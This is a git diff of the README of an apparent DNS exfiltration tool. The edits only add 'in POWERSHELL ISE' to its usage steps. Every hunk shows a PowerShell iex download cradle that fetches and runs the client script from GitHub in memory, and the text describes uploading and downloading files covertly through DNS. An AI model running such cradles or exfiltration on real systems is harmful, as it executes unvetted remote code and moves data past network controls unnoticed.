@@ -121,7 +121,7 @@ Fetches a group of fragments which are all returned in separate CNAME records, a
 
 ### Downloading the script
 
-To download and run the client script without creating a temporary file you can use the following command:
+To download and run the client script without creating a temporary file you can use the following command in POWERSHELL ISE:
 
 ```powershell
 iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/Client/UserScript.ps1'))
@@ -136,7 +136,7 @@ Invoke-WebRequest -uri https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/
 
 ### Exfiltrating a file through DNS
 
-To exfiltrate (upload) a file through DNS, you need to run the user script:
+To exfiltrate (upload) a file through DNS, you need to run the user script in POWERSHELL ISE:
 
 ```powershell
 iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/Client/UserScript.ps1'))
@@ -154,7 +154,7 @@ If an error occurs, try to upload the file again as this implementation is trans
 
 ### Infiltrating a file through DNS
 
-To infiltrate (download) a file through DNS, you need to run the user script:
+To infiltrate (download) a file through DNS, you need to run the user script in POWERSHELL ISE:
 
 ```powershell
 iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/Client/UserScript.ps1'))
